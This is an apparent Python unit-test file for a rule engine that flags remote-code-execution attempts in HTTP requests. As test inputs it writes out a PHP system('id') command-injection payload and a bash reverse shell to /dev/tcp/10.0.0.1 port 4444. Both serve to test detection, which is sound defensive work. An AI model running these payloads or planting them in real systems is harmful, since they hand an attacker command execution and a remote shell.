import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from rce_guard.engine import RuleEngine
from rce_guard.models import HTTPRequest
from rce_guard.parsers import json_line_to_request, parse_raw_http


class RuleEngineTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.engine = RuleEngine()

    def test_detects_php_system_call(self) -> None:
        request = HTTPRequest(
            method="POST",
            path="/upload",
            query_string=None,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body="file=payload&cmd=system('id')",
        )
        result = self.engine.evaluate(request)
        self.assertTrue(result.is_malicious)
        self.assertTrue(any(match.rule_id == "RCE-003" for match in result.matches))

    def test_benign_request(self) -> None:
        request = HTTPRequest(
            method="GET",
            path="/",
            query_string="q=test",
            headers={"User-Agent": "unit-test"},
            body="",
        )
        result = self.engine.evaluate(request)
        self.assertFalse(result.is_malicious)

    def test_parse_json_line(self) -> None:
        line = '{"method": "GET", "path": "/", "headers": {"a": "b"}}'
        request = json_line_to_request(line)
        self.assertEqual(request.method, "GET")
        self.assertEqual(request.path, "/")

    def test_parse_raw_http(self) -> None:
        raw = (
            "POST /exec HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "Content-Type: text/plain\r\n\r\n"
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        )
        request = parse_raw_http(raw)
        result = self.engine.evaluate(request)
        self.assertTrue(result.is_malicious)
        self.assertTrue(any(match.rule_id == "RCE-006" for match in result.matches))


if __name__ == "__main__":
    unittest.main()
